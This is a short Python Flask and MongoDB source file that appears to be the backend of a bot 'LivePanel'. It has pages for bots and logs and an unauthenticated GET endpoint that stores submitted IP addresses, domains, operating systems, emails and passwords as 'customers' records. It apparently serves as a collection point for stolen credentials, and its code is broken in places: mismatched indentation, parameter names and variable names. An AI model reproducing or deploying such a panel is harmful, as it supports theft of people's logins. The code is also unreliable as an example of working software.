import pymongo
import flask
from flask import request, jsonify
app = flask.Flask(name)
app.config["DEBUG"] = True

#setup pymongo
myclient = pymongo.MongoClient("mongodb://localhost:27017/")

#create database
mydb = myclient["LivePanel"]

@app.route('/', methods=['GET'])
def home():
    return "<h1>HOME</h1><p>Home Page</p>"

@app.route('/bots', methods=['GET'])
def bots():
    return "<h1>BOTS</h1><p>This Page will show your bots</p>"

@app.route('/logs', methods=['GET'])
def logs():
    return "<h1>LOGS</h1><p>This Page will show your logs</p>"

@app.route('/logs/add/', methods=['GET'])
def api_id():

      #nullify data
      ip="" 
      domain=""
      os=""
      log_type=""
      email=""
      password=""

    #create database collection
    mycol = mydb["customers"]

    if 'ip' in request.args:
        ip = str(request.args['ip'])
    if 'domain' in request.args:
        domain = str(request.args['domain'])
    if 'os' in request.args:
        os = str(request.args['os'])
    if 'browser' in request.args:
        browser = str(request.args['browser'])
    if 'logtype' in request.args:
        logtype = str(request.args['logtype'])
    if 'email' in request.args:
        email = str(request.args['email'])
    if 'password' in request.args:
        password = str(request.args['pass'])

    #define data for database
    logs = { 
      "ip": ip, 
      "domain": domain,
      "os": os,
      "log_type": logtype,
      "email": email,
      "password": password }

    #push data to database
    x = mycol.insert_one(logs)
    return ""

#start host
app.run("0.0.0.0")